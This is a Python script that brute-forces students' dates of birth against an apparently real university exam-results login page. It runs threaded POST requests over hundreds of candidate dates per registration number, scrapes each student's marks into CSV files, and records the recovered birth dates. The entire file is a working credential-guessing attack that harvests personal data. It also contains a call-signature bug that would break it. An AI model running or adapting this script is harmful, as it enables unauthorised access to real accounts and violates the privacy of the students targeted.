import requests
from bs4 import BeautifulSoup
import re
import pandas as pd
import os
import random
import threading
import time
import csv

class GetStudentMark:

    def __init__(self, rn) -> None:
        self.regno = rn 

    url = "https://sist.sathyabama.ac.in/sist_ese_june_2023/login.php"
    student_details = []
    table_col = ["Semester", "Course Code", "Course Title", "Course Type", "Internal Marks", "External Marks", "Total", "Max. Marks", "Result"]

    def checkCredentialsCorrent(self, content):
        return str(content).find("Invalid Register Number / Date of Birth!") == -1

    def getMarks(self,dob, content):
        print(f"regno : {self.regno}, dob : {dob}")
        bs = BeautifulSoup(content, "html.parser")
        bs1 = BeautifulSoup(str(bs.find_all(name="table")[1]), "html.parser")

        cont = [ c for c in bs1.find(name="tbody").contents if c!= "\n"]

        cont = [ c.getText() for c in cont]

        output = [[]]
        count = 0
        for c in cont:
            if(len(output) < (count//9 + 1)):
                output.append([])
            output[count//9].append(c)
            count += 1

        # print(output)

        df =  pd.DataFrame(columns=self.table_col, data=output)

        print(df)

        if "marks" not in os.listdir():
            os.makedirs("marks")

        pd.DataFrame.to_csv(df, path_or_buf=f"marks/{self.regno}.csv", index=False)

    def saveDOB(self, dob):
        with open("student_details.csv", mode='a', newline='') as file:
            writer = csv.writer(file)
            writer.writerow([self.regno, dob])

    def findDob(self):
        attempt_no = 0
        for dob in dates:
            body = {
                    "regno": str(self.regno),
                    "dob" : dob
                    }
            reponse = requests.post(url=self.url, data=body)
            print(f"trying..... {self.regno} : {dob}")
            print(f"remaing {len(dates)-attempt_no} attempts")
            attempt_no +=1
            if self.checkCredentialsCorrent(reponse.content):
                print(f"dob found")
                
                self.student_details.append([self.regno,dob])
                self.getMarks(self.regno, dob, reponse.content)
                break
            else:
                print(f"trying again....")

if __name__ == "__main__":

    pd.DataFrame.to_csv(pd.DataFrame(columns=["regno", "DOB"], data=[]), "student_details.csv")

        
    all_regno = [41110198, 4110189]

    dates = pd.date_range('1/1/2003', periods = (365), freq ='d').strftime("%d/%m/%Y").tolist()
    random.shuffle(dates)
    dates += pd.date_range('7/1/2002', '12/31/2002', freq ='d').strftime("%d/%m/%Y").tolist() 
    random.shuffle(dates)
    dates += pd.date_range('1/1/2004', '6/30/2004', freq ='d').strftime("%d/%m/%Y").tolist()
    random.shuffle(dates)
    dates += pd.date_range('7/1/2004', '12/31/2004', freq ='d').strftime("%d/%m/%Y").tolist()
    random.shuffle(dates)
    dates += pd.date_range('1/1/2002', '6/30/2002', freq ='d').strftime("%d/%m/%Y").tolist()
    random.shuffle(dates)


    threads = []

    # start all of the threads
    for rn in all_regno:
        getStudentMark = GetStudentMark(rn)
        thread = threading.Thread(target = getStudentMark.findDob)
        thread.start()
        threads.append(thread)

    # now wait for them all to finish
    for thread in threads:
        thread.join()
   
    
